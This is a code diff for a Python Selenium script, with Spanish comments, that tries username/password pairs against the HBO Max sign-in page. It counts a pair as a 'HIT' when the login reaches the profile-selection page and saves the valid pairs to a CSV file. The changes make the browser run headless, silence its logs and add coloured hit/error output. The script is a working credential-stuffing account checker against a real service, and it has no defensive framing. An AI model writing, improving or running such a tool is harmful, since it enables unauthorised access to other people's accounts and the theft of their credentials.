@@ -3,20 +3,26 @@ import csv
 import locale
 import time
 from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException, WebDriverException
 from tqdm import tqdm
 from datetime import datetime
+from colorama import Fore
 
 
 def iniciar_sesion(usuario, contrasena, credenciales_validas):
     driver = None
 
     try:
-        driver = webdriver.Chrome()
-        driver.maximize_window()
+        # Inicializar el navegador Chrome
+        chrome_options = Options()
+        chrome_options.add_argument('--headless')  # Habilita el modo headless
+        chrome_options.add_argument("--disable-logging")  # Desactivar los logs de DevTools
+        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
+        driver = webdriver.Chrome(options=chrome_options)
 
         # Acceder a la página de inicio de sesión de HBO Max
         driver.get('https://play.hbomax.com/signIn')
@@ -46,17 +52,25 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
         valid_url = 'https://play.hbomax.com/profile/select'
         # Verificar si hay un mensaje de error
         if valid_url in driver.current_url:
-            print(f"Las credenciales {usuario}:{contrasena} funcionan correctamente")
+            print(
+                f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}HIT{Fore.RESET} | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} funcionan correctamente"
+            )
             credenciales_validas.append((usuario, contrasena))
         else:
-            print(f"Las credenciales {usuario}:{contrasena} son inválidas")
+            print(
+                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}  son inválidas"
+            )
 
     except NoSuchElementException:
-        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
+        print(
+                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
+            )
     except WebDriverException as e:
-        print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}")
+        print(
+                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Hubo un problema al intentar iniciar sesión con {Fore.RED}{usuario}:{contrasena}{Fore.RESET}"
+            )
     except Exception as e:
-        print(f"Error inesperado: {str(e)}")
+        print(str(e))
     finally:
         if driver:
             driver.quit()
@@ -89,12 +103,20 @@ if credenciales_validas:
     now = datetime.now()
     format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo
 
+    # Cabeceras
+    headers = ['Username', 'Password']
+
     # Guardar las credenciales válidas en un archivo .csv
     file_path = f'results/credenciales_validas_hbomax_{format_date}.csv'
-    with open(file_path, 'w') as csv_file:
-        for credencial in credenciales_validas:
-            csv_file.write(f"{credencial[0]},{credencial[1]}\n")
+    with open(file_path, 'w', newline='') as csv_file:
+        # Escribir cabeceras y luego credenciales
+        csv_writer = csv.writer(csv_file)
+        csv_writer.writerow(headers)
 
-    print(f"Credenciales válidas guardadas en {file_path}")
+        for credencial in credenciales_validas:
+            csv_writer.writerow(credencial)
+
+    print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en {file_path}")
+
 else:
-    print("No hay credenciales válidas para guardar.")
+    print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales válidas para guardar.")
